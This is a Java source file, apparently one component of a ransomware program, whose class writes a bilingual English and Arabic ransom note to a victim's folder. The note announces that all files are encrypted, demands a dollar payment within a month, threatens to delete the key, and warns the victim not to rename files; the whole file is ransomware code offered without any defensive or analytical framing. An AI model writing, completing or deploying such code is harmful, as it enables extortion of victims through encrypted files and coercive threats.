package files;

import java.io.FileWriter;
import java.io.IOException;

import java.text.SimpleDateFormat;
import java.time.LocalDate;
import java.util.Date;

public class CreateReadMeFile {
    private static String victimID, encryptionKey;
    private float salaryOfEncryptionKey;
    private String content;
    private FileWriter readMeFile;


    public CreateReadMeFile(String victimID, String encryptionKey, float salaryOfEncryptionKey){
        setVictimID(victimID);
        setEncryptionKey(encryptionKey);
        setSalaryOfEncryptionKey(salaryOfEncryptionKey);
        initContent();
    }

    public void initContent() {
        SimpleDateFormat df = new SimpleDateFormat("yyy-MM-dd");
        String date = df.format(new Date());
        content = "All your files are encrypted n_n, but don't worry the encryption key is safe on our database :D\n" +
                "If you want to get the key, you can go to the following link and pay " + salaryOfEncryptionKey + "$ and we will send the key to you within 72 hours \uD83D\uDE09\n" +
                "Also note that hosting the database is not free, so please pay the amount within a month from the date of " + date + ", and if you do not do this, your key will be deleted and we will not be able to help you retrieve your files\n" +
                "Also, do not try to change the names of the files and delete our extension because this may damage the file permanently\n" +
                "Please keep your ID because you need to pay\n" +
                "-------------------------------------------------------------------\n" +
                "ID: " + victimID + "\n" +
                "the key: " + encryptionKey + "\n" +
                "good luck (;";

        // Arabic
        content += "\n****************************************************\n" +
                "لقد تم تشفير جميع ملفاتك n_n، ولكن لا تقلق مفتاح التشفير في مأمن علي قاعدة البيانات الخاصة بنا :D \n" +
                "اذا كنت تريد الحصول علي المفتاح يمكنك التوجه الي الرابط التالي ودفع " + salaryOfEncryptionKey + "$ وسوف نرسل لك المفتاح في خلال 72 ساعة \uD83D\uDE09\n" +
                "ايضا لاحظ ان استضافة قاعدة البيانات ليست بالمجان لذا يرجي دفع المبلغ في خلال شهر من تاريخ " + date + " واذا لم تفعل ذالك سوف يتم حذف المفتاح الخاص بك ولن نتمكن من مساعدتك في استرجاع الملفات الخاصة بك\n" +
                "ايضا لا تحاول تغير اسماء الملفات وحذف الامتداد الخاص بنا لان هذا قد يتلف المف تلف دائم\n" +
                "يرجي الاحتفاظ بالمعرف الخاص بك لانك تحتاجة للدفع\n" +
                "------------------------------------------------------------------\n" +
                "المعرف: " + victimID + "\n" +
                "المفتاح: " + encryptionKey + "\n" +
                "حظا سعيدا (;";
    }

    public void create (String path) throws IOException {
        readMeFile = new FileWriter(path + "\\Readme.txt");
        readMeFile.write(content);
        readMeFile.close();
        readMeFile = null; // Remove object from memory
    }
    public void setVictimID(String victimID) {
        CreateReadMeFile.victimID = victimID;
    }
    public void setEncryptionKey(String encryptionKey) {
        CreateReadMeFile.encryptionKey = encryptionKey;
    }
    public void setSalaryOfEncryptionKey(float salaryOfEncryptionKey) {
        this.salaryOfEncryptionKey = salaryOfEncryptionKey;
    }
}
